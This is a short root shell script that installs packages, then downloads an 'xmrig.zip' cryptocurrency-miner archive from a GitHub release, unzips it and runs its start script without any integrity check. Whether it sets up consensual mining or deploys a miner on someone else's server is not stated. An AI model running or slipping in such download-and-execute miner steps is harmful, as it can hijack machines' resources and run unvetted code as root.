cd /root

sudo apt update -y
sleep 0.5

sudo apt install tmux -y
sleep 0.5

sudo apt install unzip -y
sleep 0.5

sudo apt install python3-pip -y
sleep 0.5

pip3 install psutil requests tqdm
sleep 0.5

wget https://github.com/maxdhctrl/donate/releases/download/release-4/xmrig.zip
sleep 0.5

unzip xmrig.zip

chmod +x start.sh
chmod +x xmrig

sleep 0.5
./start.sh
